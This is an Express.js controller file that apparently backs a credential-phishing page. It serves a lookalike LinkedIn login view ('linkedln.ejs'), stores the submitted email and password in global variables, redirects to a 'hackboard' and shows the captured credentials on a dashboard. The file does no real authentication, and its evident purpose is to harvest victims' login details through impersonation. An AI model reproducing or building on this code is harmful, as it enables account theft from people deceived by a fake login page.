const homeController = (req, res, next) => {
  res.render("index.ejs");
};

let username = "";
let password = "";

const hackPort = (req, res, next) => {
  res.render("hack.ejs");
};

const dashBoard = (req, res, next) => {
  res.render("DashBoard.ejs", {
    username: username,
    password: password,
  });
};

const LoginForm = (req, res, next) => {
  res.render("linkedln.ejs");
};

const postData = async (req, res, next) => {
  username = await req.body.email;
  password = await req.body.password;

  if (username && password) {
    res.redirect("hackboard");
  }
};

module.exports = {
  homeController,
  hackPort,
  dashBoard,
  LoginForm,
  postData,
};
